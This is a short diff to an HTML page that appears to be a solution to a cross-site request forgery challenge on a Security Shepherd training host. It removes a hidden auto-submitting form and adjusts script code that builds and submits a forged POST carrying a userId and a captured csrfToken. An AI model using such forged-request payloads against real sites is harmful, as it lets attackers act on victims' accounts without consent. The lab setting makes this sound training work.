@@ -7,10 +7,6 @@
     <body>
         <h1>Crazydais - CSR</h1>
 
-        <form id="csrf" action="https://shepherd.waratek.lan/user/csrfchallengethree/plusplus" method="POST">
-            <input type="hidden" name="userId" value="fcab4e7dfbe01ce4e3904b97febe6a6a184302c3"/>
-        </form>
-
         <script>
             (function () {
                 
@@ -39,7 +35,9 @@
                 form.method = 'POST';
                 addInputToForm(form, 'userId', id);
                 addInputToForm(form, 'csrfToken', csrf);
-                document.appendChild(form);
+                
+                var header = document.getElementById("header");
+                header.appendChild(form);
                 form.submit();
             }
         </script>
